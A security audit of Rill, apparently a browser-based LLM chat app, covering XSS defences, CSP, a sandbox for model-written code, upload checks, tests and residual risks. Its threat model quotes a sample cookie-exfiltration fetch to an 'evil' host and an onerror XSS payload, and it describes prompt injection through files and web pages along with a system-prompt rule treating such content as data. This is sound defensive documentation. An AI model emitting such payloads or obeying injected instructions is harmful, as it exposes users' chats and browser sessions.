# Security audit

Rill reads untrusted input from four places: **model output**, **uploaded files**, **web
research results**, and **code the model writes**. This document lists every place that
input can reach, the control on each one, how it is tested, and the risks that remain.

Scope: everything in this repository as of this audit. The model weights and the browser are out of scope.

## Threat model

| Attacker | Goal | Example |
|---|---|---|
| Malicious file | Run script in Rill's origin, steal chats | PDF with JavaScript or XFA, `.html` or `.svg` with `<script>`, a file name with HTML in it |
| Prompt injection (file or web page) | Make the model emit HTML or links that run script, or make it run harmful code | A page that says "reply with `<img src=x onerror=…>`" |
| Model-written code | Escape the sandbox to read IndexedDB or exfiltrate data | `fetch('https://evil/?'+document.cookie)`, `indexedDB.open('rill')` |
| Hostile site | Abuse Rill's origin through framing | Framing `sandbox.html` so it runs code with Rill's origin |

Rill has no server and no secrets. What needs protecting is the user's local data (chats, files,
notes) and their browser session.

## Controls

### 1. No HTML ever reaches the DOM (XSS)

- **Rendering.** `js/ui/markdown.js` is a small Markdown renderer that builds DOM nodes with
  `createElement` and `textContent`/`append`. It never parses HTML. Raw HTML in model output
  shows up as literal text.
- **Links.** `safeHref()` allows only `http:`, `https:` and `mailto:` URLs, parsed with `new URL`.
  Anything else (`javascript:`, `data:`, `vbscript:`, protocol-relative tricks) is rendered as plain text.
  External links get `rel="noopener noreferrer nofollow"`, `referrerpolicy="no-referrer"` and `target="_blank"`.
- **No images from model output.** The renderer has no image syntax, so injected Markdown can't
  load tracking pixels or leak data through image URLs.
- **DOM helper.** `h()` in `js/ui/dom.js` refuses string `on*` handlers, `href`, `src`, `srcdoc`, `action`,
  `formaction` and `style` attributes, so a URL can only be set where a validated value is assigned on purpose.
- **Trusted Types.** The CSP sets `require-trusted-types-for 'script'`, and `js/trusted-types.js`
  installs a default policy that **throws on any HTML or script string**. So even a future bug that
  writes `el.innerHTML = modelText` fails safely in Chromium browsers instead of running script.
  Script URLs (workers, modules) must be under Rill's own base path or be same-origin `blob:` URLs.
- **File names** are cleaned by `safeName()`: control and bidi-override characters (`U+202E` and
  similar) are removed so `invoice\u202Efdp.exe` can't pretend to be a PDF. Names are only ever set with `textContent`.

### 2. Content Security Policy

Set with a `<meta>` tag in `index.html`, because GitHub Pages can't send headers:

```
default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; worker-src 'self' blob:;
connect-src 'self' https://huggingface.co https://*.huggingface.co https://*.hf.co https://*.wikipedia.org https://r.jina.ai;
img-src 'self' data: blob:; style-src 'self'; font-src 'self'; frame-src 'self';
media-src 'self'; object-src 'none'; base-uri 'self'; form-action 'none';
require-trusted-types-for 'script'; trusted-types default
```

- No inline scripts, no `unsafe-eval` and no inline styles in the main app. `wasm-unsafe-eval` is
  needed to compile ONNX Runtime's WebAssembly.
- `connect-src` lists only the model host, Wikipedia and the optional reader proxy, so injected
  code that got past everything else still couldn't send data anywhere else.
- All libraries and fonts are **vendored**. Nothing loads from a CDN, so a CDN compromise can't
  inject script.

### 3. The JavaScript sandbox (`run_js`)

Code the model writes runs in three layers:

1. **Sandboxed iframe** (`sandbox="allow-scripts"`, no `allow-same-origin`). It has an *opaque origin*,
   so it can't read Rill's IndexedDB, localStorage or cookies, and it can't touch the parent DOM.
   `sandbox.html` has its own CSP with `connect-src 'none'`.
2. **A new Worker for every run**, created inside the iframe. Before the user code runs, a prelude
   deletes or overrides network, storage and messaging APIs on the worker global and its prototypes:
   `fetch`, `XMLHttpRequest`, `WebSocket`, `WebTransport`, `EventSource`, `importScripts`,
   `indexedDB`, `caches`, `BroadcastChannel`, `Worker`, `navigator`, `location`, `WebAssembly`,
   `postMessage` and more. The prelude keeps a private reference to `postMessage` to send back the result.
3. **Hard timeouts.** The iframe kills the worker after the job timeout (5 s by default, 30 s at most).
   The main thread has its own watchdog that throws the whole iframe away if the iframe stops answering.

Other details:

- Code is capped at 50,000 characters, and output is clipped before it goes back to the model.
- Results cross the boundary with `postMessage` as plain strings and are rendered as text.
- `sandbox.html` checks that `self.origin === 'null'` and that it has a parent before it runs
  anything. If someone opens it directly, or frames it *without* the sandbox attribute (which
  would give it Rill's origin), it does nothing.
- Messages are accepted only from the expected window (`e.source` checks on both sides).

### 4. Uploads

- **Allowlist by extension** (`classify()`): PDF plus common text, data and code formats. SVG, Office files,
  images and executables are rejected. HTML and code files are accepted, but only as plain text. Code files are **read as text and never run**.
- **Size limits:** PDFs up to 25 MB and 300 pages; text files up to 2 MB; at most 20 files.
- **Magic-byte check:** a `.pdf` must contain the `%PDF-` header in its first 1 KB. Text files containing NUL bytes are rejected as binary.
- **PDF parsing** uses vendored pdf.js in its own worker with `isEvalSupported: false`,
  `enableXfa: false`, `disableFontFace: true` and `useSystemFonts: false`. Only text is extracted
  (`getTextContent`). Nothing is rendered, so PDF JavaScript, forms, annotations and embedded fonts never run.
- Extracted text is stored in IndexedDB and shown only through the Markdown renderer or `textContent`.

### 5. Research and network

- Wikipedia is called with `credentials: 'omit'` and `referrerPolicy: 'no-referrer'`.
- `read_page` accepts only `http(s)` URLs. Non-Wikipedia pages go through `https://r.jina.ai/`
  **only if the user turns on the web reader in Settings** (off by default). When it is on, the URL
  being read is sent to Jina AI. Settings explains this.
- Results are clipped and treated as untrusted text: they go back to the model as tool output and
  are never rendered as HTML.

### 6. Prompt injection

A 1.7B model will follow instructions it finds in files or web pages. Rill can't stop that.
Instead it limits what a fooled model can do:

- The model has **no tools that act outside the browser**: no email, no purchases, no file writes,
  no arbitrary network requests. The worst it can do is write a misleading reply, run sandboxed
  code, or save a misleading note or plan, all of which the user can see.
- Every tool call is shown in the chat with its arguments and its result.
- The system prompt tells the model that file and web content is data, not instructions.

## Verification

Automated (`tests/e2e.py`, run in demo mode against a real Chromium):

| Check | Result |
|---|---|
| Sandbox: `fetch`, `indexedDB` and `document` are unavailable | pass |
| Sandbox: `while(true){}` is killed by the timeout | pass |
| Model output with `<img onerror>`, `<script>` and `javascript:` links creates no elements, no links and no alert | pass |
| `innerHTML` assignment throws under Trusted Types | pass |
| A fake PDF (wrong magic bytes) is rejected | pass |
| A binary file renamed to `.txt` is rejected | pass |

Unit tests (`tests/*.test.mjs`) cover the tool-call parser, file classification, bidi stripping,
binary detection and history trimming.

Manual review: every DOM write in `js/` was checked. `grep -rn "innerHTML\|outerHTML\|insertAdjacentHTML\|document.write" js/` returns nothing.

## Residual risks and recommendations

| Risk | Severity | Notes |
|---|---|---|
| **Clickjacking.** `frame-ancestors` doesn't work in a `<meta>` CSP, and Pages can't send `X-Frame-Options`. | Low | Rill has no state-changing actions that matter to a third party. Host behind a CDN with a `frame-ancestors 'none'` header if this matters to you. |
| **Trusted Types only in Chromium.** Firefox and Safari ignore it. | Low | The renderer doesn't use HTML sinks at all, so Trusted Types is defence in depth. |
| **Sandbox depends on browser isolation.** A browser bug in iframe or worker isolation could weaken layer 1. | Low | Layers 2 and 3 still apply. Keep the browser updated. |
| **CPU denial of service from model code** inside the timeout window. | Low | At most 30 s per run, one run at a time. |
| **Web reader privacy.** URLs are sent to Jina AI when it is enabled. | Info | Off by default and explained in Settings. |
| **Model weights** are fetched from Hugging Face at runtime without pinning to a commit. | Low | Pin a revision in `js/core/engine.js` if you need reproducible builds. |
| **Shared origin on `github.io`.** All of a user's project sites share `<user>.github.io`, and so do their IndexedDB data. | Medium for people who host other untrusted projects | Use a custom domain or a dedicated account/organisation for Rill. |
